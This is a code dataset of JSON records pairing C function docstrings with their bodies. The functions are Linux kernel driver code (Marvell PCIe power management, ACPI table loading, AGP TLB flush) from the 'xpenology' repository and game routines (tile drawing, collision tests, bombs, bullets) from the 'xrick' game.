{"docstring": "/*******************************************************************************\n* mvPexActiveStateLinkPMEnable\n*\n* DESCRIPTION:\n*       Enable Active Link State Power Management\n*\n* INPUT:\n*       pexIf   - PEX interface number.\n*\tenable\t- MV_TRUE to enable ASPM, MV_FALSE to disable.\n*\n* OUTPUT:\n*       None\n*\n* RETURN:\n*       MV_OK on success , MV_ERROR otherwise\n*\n*******************************************************************************/\n", "func_signal": "MV_STATUS mvPexActiveStateLinkPMEnable(MV_U32 pexIf, MV_BOOL enable)", "code": "{\n\tMV_U32 reg;\n\n\tif(pexIf >= mvCtrlPexMaxIfGet())\n\t{\n\t\tmvOsPrintf(\"mvPexActiveStateLinkPMEnable: ERR. Invalid PEX interface %d\\n\", pexIf);\n\t\treturn MV_ERROR;\n\t}\n\n\treg = MV_REG_READ(PEX_PWR_MNG_EXT_REG(pexIf)) & ~PXPMER_L1_ASPM_EN_MASK;\n\tif(enable == MV_TRUE)\n\t\treg |= PXPMER_L1_ASPM_EN_MASK;\n\tMV_REG_WRITE(PEX_PWR_MNG_EXT_REG(pexIf), reg);\n\n\t/* Enable / Disable L0/1 entry */ \n\treg = MV_REG_READ(PEX_CFG_DIRECT_ACCESS(pexIf, PEX_LINK_CTRL_STAT_REG))\n\t\t\t& ~PXLCSR_ASPM_CNT_MASK;\n\tif(enable == MV_TRUE)\n\t\treg |= PXLCSR_ASPM_CNT_L0S_L1S_ENT_SUPP;\n\tMV_REG_WRITE(PEX_CFG_DIRECT_ACCESS(pexIf, PEX_LINK_CTRL_STAT_REG), reg);\n\n\treturn MV_OK;\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexLocalBusNumGet - Get PEX interface local bus number.\n*\n* DESCRIPTION:\n*       This function gets the local bus number of a given PEX interface.\n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       Local bus number.0xffffffff on Error\n*\n*******************************************************************************/\n", "func_signal": "MV_U32 mvPexLocalBusNumGet(MV_U32 pexIf)", "code": "{\n\tMV_U32 pexStatus;\n\n\t/* Parameter checking   */\n\tif (PEX_DEFAULT_IF != pexIf)\n\t{\n\t\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t\t{\n\t\t\tmvOsPrintf(\"mvPexLocalBusNumGet: ERR. Invalid PEX interface %d\\n\",pexIf);\n\t\t\treturn 0xFFFFFFFF;\n\t\t}\n\t}\n\n\n\tpexStatus  = MV_REG_READ(PEX_STATUS_REG(pexIf));\n\n\tpexStatus &= PXSR_PEX_BUS_NUM_MASK;\n\n\treturn (pexStatus >> PXSR_PEX_BUS_NUM_OFFS);\n\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_remove_table_handler\n *\n * PARAMETERS:  Handler         - Table event handler that was installed\n *                                previously.\n *\n * RETURN:      Status\n *\n * DESCRIPTION: Remove table event handler\n *\n ******************************************************************************/\n", "func_signal": "acpi_status acpi_remove_table_handler(acpi_tbl_handler handler)", "code": "{\n\tacpi_status status;\n\n\tACPI_FUNCTION_TRACE(acpi_remove_table_handler);\n\n\tstatus = acpi_ut_acquire_mutex(ACPI_MTX_EVENTS);\n\tif (ACPI_FAILURE(status)) {\n\t\treturn_ACPI_STATUS(status);\n\t}\n\n\t/* Make sure that the installed handler is the same */\n\n\tif (!handler || handler != acpi_gbl_table_handler) {\n\t\tstatus = AE_BAD_PARAMETER;\n\t\tgoto cleanup;\n\t}\n\n\t/* Remove the handler */\n\n\tacpi_gbl_table_handler = NULL;\n\n      cleanup:\n\t(void)acpi_ut_release_mutex(ACPI_MTX_EVENTS);\n\treturn_ACPI_STATUS(status);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*\n * This routine could be implemented by taking the addresses\n * written to the GATT, and flushing them individually.  However\n * currently it just flushes the whole table.  Which is probably\n * more efficient, since agp_memory blocks can be a large number of\n * entries.\n */\n", "func_signal": "static void serverworks_tlbflush(struct agp_memory *temp)", "code": "{\n\tunsigned long timeout;\n\n\twriteb(1, serverworks_private.registers+SVWRKS_POSTFLUSH);\n\ttimeout = jiffies + 3*HZ;\n\twhile (readb(serverworks_private.registers+SVWRKS_POSTFLUSH) == 1) {\n\t\tcpu_relax();\n\t\tif (time_after(jiffies, timeout)) {\n\t\t\tdev_err(&serverworks_private.svrwrks_dev->dev,\n\t\t\t\t\"TLB post flush took more than 3 seconds\\n\");\n\t\t\tbreak;\n\t\t}\n\t}\n\n\twritel(1, serverworks_private.registers+SVWRKS_DIRFLUSH);\n\ttimeout = jiffies + 3*HZ;\n\twhile (readl(serverworks_private.registers+SVWRKS_DIRFLUSH) == 1) {\n\t\tcpu_relax();\n\t\tif (time_after(jiffies, timeout)) {\n\t\t\tdev_err(&serverworks_private.svrwrks_dev->dev,\n\t\t\t\t\"TLB Dir flush took more than 3 seconds\\n\");\n\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "drivers\\char\\agp\\sworks-agp.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_tb_load_namespace\n *\n * PARAMETERS:  None\n *\n * RETURN:      Status\n *\n * DESCRIPTION: Load the namespace from the DSDT and all SSDTs/PSDTs found in\n *              the RSDT/XSDT.\n *\n ******************************************************************************/\n", "func_signal": "static acpi_status acpi_tb_load_namespace(void)", "code": "{\n\tacpi_status status;\n\tu32 i;\n\tstruct acpi_table_header *new_dsdt;\n\n\tACPI_FUNCTION_TRACE(tb_load_namespace);\n\n\t(void)acpi_ut_acquire_mutex(ACPI_MTX_TABLES);\n\n\t/*\n\t * Load the namespace. The DSDT is required, but any SSDT and\n\t * PSDT tables are optional. Verify the DSDT.\n\t */\n\tif (!acpi_gbl_root_table_list.current_table_count ||\n\t    !ACPI_COMPARE_NAME(&\n\t\t\t       (acpi_gbl_root_table_list.\n\t\t\t\ttables[ACPI_TABLE_INDEX_DSDT].signature),\n\t\t\t       ACPI_SIG_DSDT)\n\t    ||\n\t    ACPI_FAILURE(acpi_tb_verify_table\n\t\t\t (&acpi_gbl_root_table_list.\n\t\t\t  tables[ACPI_TABLE_INDEX_DSDT]))) {\n\t\tstatus = AE_NO_ACPI_TABLES;\n\t\tgoto unlock_and_exit;\n\t}\n\n\t/*\n\t * Save the DSDT pointer for simple access. This is the mapped memory\n\t * address. We must take care here because the address of the .Tables\n\t * array can change dynamically as tables are loaded at run-time. Note:\n\t * .Pointer field is not validated until after call to acpi_tb_verify_table.\n\t */\n\tacpi_gbl_DSDT =\n\t    acpi_gbl_root_table_list.tables[ACPI_TABLE_INDEX_DSDT].pointer;\n\n\t/*\n\t * Optionally copy the entire DSDT to local memory (instead of simply\n\t * mapping it.) There are some BIOSs that corrupt or replace the original\n\t * DSDT, creating the need for this option. Default is FALSE, do not copy\n\t * the DSDT.\n\t */\n\tif (acpi_gbl_copy_dsdt_locally) {\n\t\tnew_dsdt = acpi_tb_copy_dsdt(ACPI_TABLE_INDEX_DSDT);\n\t\tif (new_dsdt) {\n\t\t\tacpi_gbl_DSDT = new_dsdt;\n\t\t}\n\t}\n\n\t/*\n\t * Save the original DSDT header for detection of table corruption\n\t * and/or replacement of the DSDT from outside the OS.\n\t */\n\tACPI_MEMCPY(&acpi_gbl_original_dsdt_header, acpi_gbl_DSDT,\n\t\t    sizeof(struct acpi_table_header));\n\n\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\n\t/* Load and parse tables */\n\n\tstatus = acpi_ns_load_table(ACPI_TABLE_INDEX_DSDT, acpi_gbl_root_node);\n\tif (ACPI_FAILURE(status)) {\n\t\treturn_ACPI_STATUS(status);\n\t}\n\n\t/* Load any SSDT or PSDT tables. Note: Loop leaves tables locked */\n\n\t(void)acpi_ut_acquire_mutex(ACPI_MTX_TABLES);\n\tfor (i = 0; i < acpi_gbl_root_table_list.current_table_count; ++i) {\n\t\tif ((!ACPI_COMPARE_NAME\n\t\t     (&(acpi_gbl_root_table_list.tables[i].signature),\n\t\t      ACPI_SIG_SSDT)\n\t\t     &&\n\t\t     !ACPI_COMPARE_NAME(&\n\t\t\t\t\t(acpi_gbl_root_table_list.tables[i].\n\t\t\t\t\t signature), ACPI_SIG_PSDT))\n\t\t    ||\n\t\t    ACPI_FAILURE(acpi_tb_verify_table\n\t\t\t\t (&acpi_gbl_root_table_list.tables[i]))) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (no_auto_ssdt) {\n\t\t\tprintk(KERN_WARNING \"ACPI: SSDT ignored due to \\\"acpi_no_auto_ssdt\\\"\\n\");\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* Ignore errors while loading tables, get as many as possible */\n\n\t\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\t\t(void)acpi_ns_load_table(i, acpi_gbl_root_node);\n\t\t(void)acpi_ut_acquire_mutex(ACPI_MTX_TABLES);\n\t}\n\n\tACPI_DEBUG_PRINT((ACPI_DB_INIT, \"ACPI Tables successfully acquired\\n\"));\n\n      unlock_and_exit:\n\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\treturn_ACPI_STATUS(status);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*\n * Draw a sub-list of tiles onto the frame buffer\n * start at position indicated by fb ; leave fb pointing to the next\n * tile to the right of the last tile drawn\n *\n * ASM 1e41\n * fpb: CHANGED (see above)\n * draw_tllst: CHANGED points to the element following 0xfe/0xff end code\n * returns: end code (0xfe : end of list ; 0xff : end of sub-list)\n */\n", "func_signal": "U8\ndraw_tilesSubList()", "code": "{\n  U8 i;\n\n  i = *(draw_tllst++);\n  while (i != 0xFF && i != 0xFE) {  /* while not end */\n    draw_tile(i);  /* draw tile */\n    i = *(draw_tllst++);\n  }\n  return i;\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Redraw the map behind a sprite\n * align to tile column and row, and clip\n *\n * x, y: sprite position (pixels, map).\n */\n", "func_signal": "void\ndraw_spriteBackground(U16 x, U16 y)", "code": "{\n  U8 r, c;\n  U16 rmax, cmax;\n  S16 xmap, ymap;\n  U16 xs, ys;\n\n  /* aligne to column and row, prepare map coordinate, and clip */\n  xmap = x & 0xFFF8;\n  ymap = y & 0xFFF8;\n  cmax = (x - xmap == 0 ? 0x20 : 0x28);  /* width, 4 tl cols, 8 pix each */\n  rmax = (y & 0x04) ? 0x20 : 0x18;  /* height, 3 or 4 tile rows */\n  if (draw_clipms(&xmap, &ymap, &cmax, &rmax))  /* don't draw if fully clipped */\n    return;\n\n  /* get back to screen */\n  xs = xmap - DRAW_XYMAP_SCRLEFT;\n  ys = ymap - DRAW_XYMAP_SCRTOP;\n  xmap >>= 3;\n  ymap >>= 3;\n  cmax >>= 3;\n  rmax >>= 3;\n\n  /* draw */\n  for (r = 0; r < rmax; r++) {  /* for each row */\n#ifdef GFXPC\n    draw_setfb(xs, ys + r * 8);\n#endif\n#ifdef GFXST\n    draw_setfb(xs, 8 + ys + r * 8);\n#endif\n    for (c = 0; c < cmax; c++) {  /* for each column */\n      draw_tile(map_map[ymap + r][xmap + c]);\n    }\n  }\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Bomb hit test\n *\n * ASM 11CD\n * returns: TRUE/hit, FALSE/not\n */\n", "func_signal": "U8 e_bomb_hit(U8 e)", "code": "{\n\tif (ent_ents[e].x > (E_BOMB_ENT.x >= 0xE0 ? 0xFF : E_BOMB_ENT.x + 0x20))\n\t\t\treturn FALSE;\n\tif (ent_ents[e].x + ent_ents[e].w < (E_BOMB_ENT.x > 0x04 ? E_BOMB_ENT.x - 0x04 : 0))\n\t\t\treturn FALSE;\n\tif (ent_ents[e].y > (E_BOMB_ENT.y + 0x1D))\n\t\t\treturn FALSE;\n\tif (ent_ents[e].y + ent_ents[e].h < (E_BOMB_ENT.y > 0x0004 ? E_BOMB_ENT.y - 0x0004 : 0))\n\t\t\treturn FALSE;\n\treturn TRUE;\n}", "path": "src\\e_bomb.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Clip to map screen\n *\n * x, y: position (pixels, map) CHANGED clipped\n * width, height: dimension CHANGED clipped\n * return: TRUE if fully clipped, FALSE if still (at least partly) visible\n */\n", "func_signal": "U8\ndraw_clipms(S16 *x, S16 *y, U16 *width, U16 *height)", "code": "{\n  if (*x < 0) {\n    if (*x + *width < 0)\n      return TRUE;\n    else {\n      *width += *x;\n      *x = 0;\n    }\n  }\n  else {\n    if (*x > 0x0100)\n      return TRUE;\n    else if (*x + *width > 0x0100) {\n      *width = 0x0100 - *x;\n    }\n  }\n\n  if (*y < DRAW_XYMAP_SCRTOP) {\n    if ((*y + *height) < DRAW_XYMAP_SCRTOP)\n      return TRUE;\n    else {\n      *height += *y - DRAW_XYMAP_SCRTOP;\n      *y = DRAW_XYMAP_SCRTOP;\n    }\n  }\n  else {\n    if (*y >= DRAW_XYMAP_HBTOP)\n      return TRUE;\n    else if (*y + *height > DRAW_XYMAP_HBTOP)\n      *height = DRAW_XYMAP_HBTOP - *y;\n  }\n\n  return FALSE;\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Panic\n */\n", "func_signal": "void\nsys_panic(char *err, ...)", "code": "{\n  va_list argptr;\n  char s[1024];\n\n  /* change stdin to non blocking */\n  /*fcntl(0, F_SETFL, fcntl (0, F_GETFL, 0) & ~FNDELAY);*/\n  /* NOTE HPUX: use ... is it OK on Linux ? */\n  /* fcntl(0, F_SETFL, fcntl (0, F_GETFL, 0) & ~O_NDELAY); */\n\n  /* prepare message */\n  va_start(argptr, err);\n  vsprintf(s, err, argptr);\n  va_end(argptr);\n\n  /* print message and die */\n  printf(\"%s\\npanic!\\n\", s);\n  exit(1);\n}", "path": "src\\system.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Entity action\n *\n * ASM 245A\n */\n", "func_signal": "void\ne_box_action(U8 e)", "code": "{\n\tstatic U8 sp[] = {0x24, 0x25, 0x26, 0x27, 0x28};  /* explosion sprites sequence */\n\n\tif (ent_ents[e].n & ENT_LETHAL) {\n\t\t/*\n\t\t * box is lethal i.e. exploding\n\t\t * play sprites sequence then stop\n\t\t */\n\t\tent_ents[e].sprite = sp[ent_ents[e].cnt >> 1];\n\t\tif (--ent_ents[e].cnt == 0) {\n\t\t\tent_ents[e].n = 0;\n\t\t\tmap_marks[ent_ents[e].mark].ent |= MAP_MARK_NACT;\n\t\t}\n\t} else {\n\t\t/*\n\t\t * not lethal: check to see if triggered\n\t\t */\n\t\tif (e_rick_boxtest(e)) {\n\t\t\t/* rick: collect bombs or bullets and stop */\n#ifdef ENABLE_SOUND\n\t\t\tsyssnd_play(WAV_BOX, 1);\n#endif\n\t\t\tif (ent_ents[e].n == 0x10)\n\t\t\t\tgame_bombs = GAME_BOMBS_INIT;\n\t\t\telse  /* 0x11 */\n\t\t\t\tgame_bullets = GAME_BULLETS_INIT;\n\t\t\tent_ents[e].n = 0;\n\t\t\tmap_marks[ent_ents[e].mark].ent |= MAP_MARK_NACT;\n\t\t}\n\t\telse if (E_RICK_STTST(E_RICK_STSTOP) &&\n\t\t\t\tu_fboxtest(e, e_rick_stop_x, e_rick_stop_y)) {\n\t\t\t/* rick's stick: explode */\n\t\t\texplode(e);\n\t\t}\n\t\telse if (E_BULLET_ENT.n && u_fboxtest(e, e_bullet_xc, e_bullet_yc)) {\n\t\t\t/* bullet: explode (and stop bullet) */\n\t\t\tE_BULLET_ENT.n = 0;\n\t\t\texplode(e);\n\t\t}\n\t\telse if (e_bomb_lethal && e_bomb_hit(e)) {\n\t\t\t/* bomb: explode */\n\t\t\texplode(e);\n\t\t}\n\t}\n}", "path": "src\\e_box.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Full box test.\n *\n * ASM 1199\n *\n * e: entity to test against.\n * x,y: coordinates to test.\n * ret: TRUE/(x,y) is within e's space, FALSE/not.\n */\n", "func_signal": "U8\nu_fboxtest(U8 e, S16 x, S16 y)", "code": "{\n  if (ent_ents[e].x >= x ||\n      ent_ents[e].x + ent_ents[e].w < x ||\n      ent_ents[e].y >= y ||\n      ent_ents[e].y + ent_ents[e].h < y)\n    return FALSE;\n  else\n    return TRUE;\n}", "path": "src\\util.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Compute the environment flag.\n *\n * ASM 0FBC if !crawl, else 103E\n *\n * x, y: coordinates where to compute the environment flag\n * crawl: is rick crawling?\n * rc0: anything CHANGED to the environment flag for crawling (6DBA)\n * rc1: anything CHANGED to the environment flag (6DAD)\n */\n", "func_signal": "void\nu_envtest(S16 x, S16 y, U8 crawl, U8 *rc0, U8 *rc1)", "code": "{\n  U8 i, xx;\n\n  /* prepare for ent #0 test */\n  ent_ents[ENT_ENTSNUM].x = x;\n  ent_ents[ENT_ENTSNUM].y = y;\n\n  i = 1;\n  if (!crawl) i++;\n  if (y & 0x0004) i++;\n\n  x += 4;\n  xx = (U8)x; /* FIXME? */\n\n  x = x >> 3;  /* from pixels to tiles */\n  y = y >> 3;  /* from pixels to tiles */\n\n  *rc0 = *rc1 = 0;\n\n  if (xx & 0x07) {  /* tiles columns alignment */\n    if (crawl) {\n      *rc0 |= (map_eflg[map_map[y][x]] &\n\t   (MAP_EFLG_VERT|MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP));\n      *rc0 |= (map_eflg[map_map[y][x + 1]] &\n\t   (MAP_EFLG_VERT|MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP));\n      *rc0 |= (map_eflg[map_map[y][x + 2]] &\n\t   (MAP_EFLG_VERT|MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP));\n      y++;\n    }\n    do {\n      *rc1 |= (map_eflg[map_map[y][x]] &\n\t       (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_FGND|\n\t\tMAP_EFLG_LETHAL|MAP_EFLG_01));\n      *rc1 |= (map_eflg[map_map[y][x + 1]] &\n\t       (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_FGND|\n\t\tMAP_EFLG_LETHAL|MAP_EFLG_CLIMB|MAP_EFLG_01));\n      *rc1 |= (map_eflg[map_map[y][x + 2]] &\n\t       (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_FGND|\n\t\tMAP_EFLG_LETHAL|MAP_EFLG_01));\n      y++;\n    } while (--i > 0);\n\n    *rc1 |= (map_eflg[map_map[y][x]] &\n\t     (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP|MAP_EFLG_FGND|\n\t      MAP_EFLG_LETHAL|MAP_EFLG_01));\n    *rc1 |= (map_eflg[map_map[y][x + 1]]);\n    *rc1 |= (map_eflg[map_map[y][x + 2]] &\n\t     (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP|MAP_EFLG_FGND|\n\t      MAP_EFLG_LETHAL|MAP_EFLG_01));\n  }\n  else {\n    if (crawl) {\n      *rc0 |= (map_eflg[map_map[y][x]] &\n\t   (MAP_EFLG_VERT|MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP));\n      *rc0 |= (map_eflg[map_map[y][x + 1]] &\n\t   (MAP_EFLG_VERT|MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_WAYUP));\n      y++;\n    }\n    do {\n      *rc1 |= (map_eflg[map_map[y][x]] &\n\t       (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_FGND|\n\t\tMAP_EFLG_LETHAL|MAP_EFLG_CLIMB|MAP_EFLG_01));\n      *rc1 |= (map_eflg[map_map[y][x + 1]] &\n\t       (MAP_EFLG_SOLID|MAP_EFLG_SPAD|MAP_EFLG_FGND|\n\t\tMAP_EFLG_LETHAL|MAP_EFLG_CLIMB|MAP_EFLG_01));\n      y++;\n    } while (--i > 0);\n\n    *rc1 |= (map_eflg[map_map[y][x]]);\n    *rc1 |= (map_eflg[map_map[y][x + 1]]);\n  }\n\n  /*\n   * If not lethal yet, and there's an entity on slot zero, and (x,y)\n   * boxtests this entity, then raise SOLID flag. This is how we make\n   * sure that no entity can move over the entity that is on slot zero.\n   *\n   * Beware! When game_cheat2 is set, this means that a block can\n   * move over rick without killing him -- but then rick is trapped\n   * because the block is solid.\n   */\n  if (!(*rc1 & MAP_EFLG_LETHAL)\n      && ent_ents[0].n\n      && u_boxtest(ENT_ENTSNUM, 0)) {\n    *rc1 |= MAP_EFLG_SOLID;\n  }\n\n  /* When game_cheat2 is set, the environment can not be lethal. */\n#ifdef ENABLE_CHEATS\n  if (game_cheat2) *rc1 &= ~MAP_EFLG_LETHAL;\n#endif\n}", "path": "src\\util.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * main\n */\n", "func_signal": "int\nmain(int argc, char *argv[])", "code": "{\n\tsys_init(argc, argv);\n\tif (sysarg_args_data)\n\t\tdata_setpath(sysarg_args_data);\n\telse\n\t\tdata_setpath(\"data.zip\");\n\tgame_run();\n\tdata_closepath();\n\tsys_shutdown();\n\treturn 0;\n}", "path": "src\\xrick.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Initialize bomb\n */\n", "func_signal": "void e_bomb_init(U16 x, U16 y)", "code": "{\n    E_BOMB_ENT.n = 0x03;\n    E_BOMB_ENT.x = x;\n    E_BOMB_ENT.y = y;\n    e_bomb_ticker = E_BOMB_TICKER;\n    e_bomb_lethal = FALSE;\n\n    /*\n     * Atari ST dynamite sprites are not centered the\n     * way IBM PC sprites were ... need to adjust things a little bit\n     */\n#ifdef GFXST\n    E_BOMB_ENT.x += 4;\n    E_BOMB_ENT.y += 5;\n#endif\n\n}", "path": "src\\e_bomb.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Display the pause indicator\n */\n", "func_signal": "void\nscreen_pause(U8 pause)", "code": "{\n  if (pause == TRUE) {\n    draw_tilesBank = 0;\n    draw_tllst = screen_pausedtxt;\n    draw_setfb(120, 80);\n#ifdef GFXPC\n    draw_filter = 0xAAAA;\n#endif\n    draw_tilesList();\n  }\n  else {\n#ifdef GFXPC\n    draw_filter = 0xFFFF;\n#endif\n    draw_map();\n    ent_draw();\n    draw_drawStatus();\n  }\n  game_rects = &draw_SCREENRECT;\n}", "path": "src\\scr_pause.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Draw a list of tiles onto the frame buffer\n * start at position indicated by fb ; at the end of each (sub)list,\n * perform a \"carriage return + line feed\" i.e. go back to the initial\n * position then go down one tile row (8 pixels)\n *\n * ASM 1e33\n * fb: CHANGED (see above)\n * draw_tllst: CHANGED points to the element following 0xfe/0xff end code\n */\n", "func_signal": "void\ndraw_tilesList(void)", "code": "{\n  U8 *t;\n\n  t = fb;\n  while (draw_tilesSubList() != 0xFE) {  /* draw sub-list */\n    t += 8 * SYSVID_WIDTH;  /* go down one tile i.e. 8 lines */\n    fb = t;\n  }\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Draw a list of tiles onto the frame buffer -- same as draw_tilesList,\n * but accept an immediate string as parameter. Note that the string needs\n * to be properly terminated with 0xfe (\\376) and 0xff (\\377) chars.\n */\n", "func_signal": "void\ndraw_tilesListImm(U8 *list)", "code": "{\n  draw_tllst = list;\n  draw_tilesList();\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Check if x,y is within e trigger box.\n *\n * ASM 126F\n * return: FALSE if not in box, TRUE if in box.\n */\n", "func_signal": "U8\nu_trigbox(U8 e, S16 x, S16 y)", "code": "{\n  U16 xmax, ymax;\n\n  xmax = ent_ents[e].trig_x + (ent_entdata[ent_ents[e].n & 0x7F].trig_w << 3);\n  ymax = ent_ents[e].trig_y + (ent_entdata[ent_ents[e].n & 0x7F].trig_h << 3);\n\n  if (xmax > 0xFF) xmax = 0xFF;\n\n  if (x <= ent_ents[e].trig_x || x > xmax ||\n      y <= ent_ents[e].trig_y || y > ymax)\n    return FALSE;\n  else\n    return TRUE;\n}", "path": "src\\util.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Print a message\n */\n", "func_signal": "void\nsys_printf(char *msg, ...)", "code": "{\n  va_list argptr;\n  char s[1024];\n\n  /* change stdin to non blocking */\n  /*fcntl(0, F_SETFL, fcntl (0, F_GETFL, 0) & ~FNDELAY);*/\n  /* NOTE HPUX: use ... is it OK on Linux ? */\n  /* fcntl(0, F_SETFL, fcntl (0, F_GETFL, 0) & ~O_NDELAY); */\n\n  /* prepare message */\n  va_start(argptr, msg);\n  vsprintf(s, msg, argptr);\n  va_end(argptr);\n  printf(s);\n}", "path": "src\\system.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Draw entire map screen background tiles onto frame buffer.\n *\n * ASM 0af5, 0a54\n */\n", "func_signal": "void\ndraw_map(void)", "code": "{\n  U8 i, j;\n\n  draw_tilesBank = map_tilesBank;\n\n  for (i = 0; i < 0x18; i++) {  /* 0x18 rows */\n#ifdef GFXPC\n    draw_setfb(0x20, (i * 8));\n#endif\n#ifdef GFXST\n    draw_setfb(0x20, 8 + (i * 8));\n#endif\n    for (j = 0; j < 0x20; j++)  /* 0x20 tiles per row */\n      draw_tile(map_map[i + 8][j]);\n  }\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Initialize bullet\n */\n", "func_signal": "void\ne_bullet_init(U16 x, U16 y)", "code": "{\n  E_BULLET_ENT.n = 0x02;\n  E_BULLET_ENT.x = x;\n  E_BULLET_ENT.y = y + 0x0006;\n  if (game_dir == LEFT) {\n    e_bullet_offsx = -0x08;\n    E_BULLET_ENT.sprite = 0x21;\n  }\n  else {\n    e_bullet_offsx = 0x08;\n    E_BULLET_ENT.sprite = 0x20;\n  }\n#ifdef ENABLE_SOUND\n  syssnd_play(WAV_BULLET, 1);\n#endif\n}", "path": "src\\e_bullet.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Draw status indicators\n *\n * ASM 0309\n */\n", "func_signal": "void\ndraw_drawStatus(void)", "code": "{\n  S8 i;\n  U32 sv;\n  static U8 s[7] = {0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0xfe};\n\n  draw_tilesBank = 0;\n\n  for (i = 5, sv = game_score; i >= 0; i--) {\n    s[i] = 0x30 + (U8)(sv % 10);\n    sv /= 10;\n  }\n  draw_tllst = s;\n\n  draw_setfb(DRAW_STATUS_SCORE_X, DRAW_STATUS_Y);\n  draw_tilesList();\n\n  draw_setfb(DRAW_STATUS_BULLETS_X, DRAW_STATUS_Y);\n  for (i = 0; i < game_bullets; i++)\n    draw_tile(TILES_BULLET);\n\n  draw_setfb(DRAW_STATUS_BOMBS_X, DRAW_STATUS_Y);\n  for (i = 0; i < game_bombs; i++)\n    draw_tile(TILES_BOMB);\n\n  draw_setfb(DRAW_STATUS_LIVES_X, DRAW_STATUS_Y);\n  for (i = 0; i < game_lives; i++)\n    draw_tile(TILES_RICK);\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
